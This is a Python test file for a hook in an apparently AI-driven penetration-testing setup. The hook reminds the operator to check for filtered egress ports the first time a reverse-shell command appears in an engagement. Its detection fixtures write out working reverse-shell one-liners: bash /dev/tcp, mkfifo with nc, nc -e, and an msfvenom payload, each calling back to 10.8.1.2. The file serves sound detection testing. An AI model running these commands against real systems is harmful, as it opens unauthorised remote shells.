"""Egress-first nudge (F1): the first reverse-shell connect-back per engagement should remind the
operator that a silent connect-back failure is usually a FILTERED egress port, not a broken
payload -- diagnose egress before grinding reverse shells.

Advisory, fail-open, fire-once per engagement (marker `.egress-nudged`).
"""
import importlib.util
import io
import json
import os
import sys
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _load():
    os.environ.setdefault("CLAUDEBRAIN_VAULT", ROOT)
    spec = importlib.util.spec_from_file_location(
        "rc", os.path.join(ROOT, "skills", "hooks", "recon-capture.py"))
    rc = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(rc)
    return rc


REVSHELL = [
    "bash -c 'bash -i >& /dev/tcp/10.8.1.2/443 0>&1'",
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.2 4444 >/tmp/f",
    "nc -e /bin/bash 10.8.1.2 1337",
    "rlwrap nc -lvnp 9001",
    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.1.2 LPORT=443 -f elf -o sh.elf",
    "bash /root/vm.sh \"python3 wp2shell.py shell --cmd 'bash -i >& /dev/tcp/10.8.1.2/443 0>&1' http://t\"",
]

NOT_REVSHELL = [
    "curl -s http://target/",
    "nmap -sCV -p- 10.10.10.10",
    "ffuf -u http://target/FUZZ -w list.txt",
    "sshpass -p pw ssh user@target id",
    "ls -la /var/www",
]


def test_is_revshell_detects_connectbacks():
    rc = _load()
    for c in REVSHELL:
        assert rc._is_revshell_cmd(c), f"should detect reverse shell: {c!r}"


def test_is_revshell_ignores_benign():
    rc = _load()
    for c in NOT_REVSHELL:
        assert not rc._is_revshell_cmd(c), f"should NOT be a reverse shell: {c!r}"


def _make_engagement(tmpdir, name="eng"):
    d = os.path.join(tmpdir, "targets", name)
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "state.md"), "w") as f:
        f.write("# Test engagement\n")
    return d


def _run_hook(cmd, output, engagement_dir, vault_path):
    payload = {"tool_name": "Bash", "tool_input": {"command": cmd}, "tool_response": output}
    old_stdin, old_cwd = sys.stdin, os.getcwd()
    old_vault = os.environ.get("CLAUDEBRAIN_VAULT")
    try:
        os.environ["CLAUDEBRAIN_VAULT"] = vault_path
        os.utime(engagement_dir, None)
        os.chdir(os.path.dirname(engagement_dir))
        sys.stdin = io.StringIO(json.dumps(payload))
        for mod in list(sys.modules.keys()):
            if "recon-capture" in mod or "_engagement" in mod:
                del sys.modules[mod]
        spec = importlib.util.spec_from_file_location(
            "rc_hook", os.path.join(ROOT, "skills", "hooks", "recon-capture.py"))
        rc = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(rc)
        old_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            rc.main()
            output_text = sys.stdout.getvalue()
        finally:
            sys.stdout = old_stdout
        if output_text:
            try:
                return json.loads(output_text).get("hookSpecificOutput", {}).get("additionalContext", "")
            except json.JSONDecodeError:
                return ""
        return ""
    finally:
        sys.stdin, _ = old_stdin, os.chdir(old_cwd)
        if old_vault is not None:
            os.environ["CLAUDEBRAIN_VAULT"] = old_vault
        elif "CLAUDEBRAIN_VAULT" in os.environ:
            del os.environ["CLAUDEBRAIN_VAULT"]
        for mod in list(sys.modules.keys()):
            if "recon-capture" in mod or "_engagement" in mod:
                del sys.modules[mod]


def test_egress_nudge_fires_on_reverse_shell():
    with tempfile.TemporaryDirectory() as tmp:
        d = _make_engagement(tmp, "egr1")
        res = _run_hook("bash -c 'bash -i >& /dev/tcp/10.8.1.2/443 0>&1'", "", d, tmp)
        assert "EGRESS-FIRST" in res, f"egress nudge should fire, got: {res!r}"


def test_egress_nudge_silent_on_benign():
    with tempfile.TemporaryDirectory() as tmp:
        d = _make_engagement(tmp, "egr2")
        res = _run_hook("curl -s http://target/", "", d, tmp)
        assert "EGRESS-FIRST" not in res, f"egress nudge should NOT fire on benign cmd, got: {res!r}"


def test_egress_nudge_fires_once_per_engagement():
    with tempfile.TemporaryDirectory() as tmp:
        d = _make_engagement(tmp, "egr3")
        first = _run_hook("nc -e /bin/bash 10.8.1.2 1337", "", d, tmp)
        second = _run_hook("bash -i >& /dev/tcp/10.8.1.2/443 0>&1", "", d, tmp)
        assert "EGRESS-FIRST" in first, f"first should fire, got: {first!r}"
        assert "EGRESS-FIRST" not in second, f"second should be suppressed by marker, got: {second!r}"
